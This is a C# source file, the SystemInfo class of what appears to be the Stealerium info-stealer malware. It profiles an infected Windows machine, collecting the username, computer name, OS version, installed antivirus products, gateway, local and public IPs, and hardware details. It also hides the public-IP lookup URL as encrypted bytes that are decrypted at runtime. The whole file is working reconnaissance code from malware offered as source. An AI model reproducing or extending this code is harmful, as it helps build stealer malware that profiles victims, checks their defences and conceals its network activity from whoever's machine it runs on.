using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.System
{
    internal sealed class SystemInfo
    {
        // Username
        public static string Username = Environment.UserName;

        // Computer name
        public static string Compname = Environment.MachineName;

        // Language
        public static string Culture = CultureInfo.CurrentCulture.ToString();

        // Current date
        public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

        // Get screen metrics
        public static string ScreenMetrics()
        {
            var bounds = Screen.GetBounds(Point.Empty);
            var width = bounds.Width;
            var height = bounds.Height;
            return width + "x" + height;
        }

        // Get battery status
        public static string GetBattery()
        {
            try
            {
                var batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                var batteryLife = SystemInformation.PowerStatus.BatteryLifePercent
                    .ToString(CultureInfo.InvariantCulture).Split(',');
                var batteryPercent = batteryLife[batteryLife.Length - 1];
                return $"{batteryStatus} ({batteryPercent}%)";
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get system version
        private static string GetWindowsVersionName()
        {
            var sData = "Unknown System";
            try
            {
                using (var mSearcher =
                       new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (var o in mSearcher.Get())
                    {
                        var tObj = (ManagementObject)o;
                        sData = Convert.ToString(tObj["Name"]);
                    }

                    sData = sData.Split('|')[0];
                    var iLen = sData.Split(' ')[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch
            {
                // ignored
            }

            return sData;
        }

        // Get bit
        private static string GetBitVersion()
        {
            try
            {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86")
                    ? "(32 Bit)"
                    : "(64 Bit)";
            }
            catch
            {
                // ignored
            }

            return "(Unknown)";
        }

        // Get system version
        public static string GetSystemVersion()
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }

        // Get default gateway
        public static string GetDefaultGateway()
        {
            try
            {
                return NetworkInterface
                    .GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == OperationalStatus.Up)
                    .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                    .Select(g => g?.Address)
                    .Where(a => a != null)
                    .FirstOrDefault()
                    ?.ToString();
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Detect antiviruse
        public static string GetAntivirus()
        {
            try
            {
                using (var antiVirusSearch = new ManagementObjectSearcher(
                           @"\\" + Environment.MachineName + @"\root\SecurityCenter2",
                           "Select * from AntivirusProduct"))
                {
                    var av = new List<string>();
                    foreach (var searchResult in antiVirusSearch.Get())
                        av.Add(searchResult["displayName"].ToString());
                    if (av.Count == 0) return "Not installed";
                    return string.Join(", ", av.ToArray()) + ".";
                }
            }
            catch
            {
                // ignored
            }

            return "N/A";
        }

        // Get local IP
        public static string GetLocalIp()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch
            {
                // ignored
            }

            return "No network adapters with an IPv4 address in the system!";
        }

        // Get public IP
        public static async Task<string> GetPublicIpAsync()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var url = StringsCrypt.Decrypt(new byte[]
                    {
                        23, 61, 220, 157, 111, 249, 43, 180, 122, 28, 107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
                        238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
                    }); // http://icanhazip.com

                    var externalip = await client.GetStringAsync(url).ConfigureAwait(false);
                    return externalip.Replace("\n", "");
                }
            }
            catch (Exception ex)
            {
                Logging.Log("SystemInfo >> GetPublicIP : Request error\n" + ex);
            }

            return "Request failed";
        }

        // Get CPU name
        public static string GetCpuName()
        {
            try
            {
                var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (var o in mSearcher.Get())
                {
                    var mObject = (ManagementObject)o;
                    return mObject["Name"].ToString();
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get GPU name
        public static string GetGpuName()
        {
            try
            {
                var mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (var o in mSearcher.Get())
                {
                    var mObject = (ManagementObject)o;
                    return mObject["Name"].ToString();
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        // Get RAM
        public static string GetRamAmount()
        {
            try
            {
                var ramAmount = 0;
                using (var mos = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (var o in mos.Get())
                    {
                        var mo = (ManagementObject)o;
                        var bytes = Convert.ToDouble(mo["TotalPhysicalMemory"]);
                        ramAmount = (int)(bytes / 1048576);
                        break;
                    }
                }

                return ramAmount + "MB";
            }
            catch
            {
                // ignored
            }

            return "-1";
        }
    }
}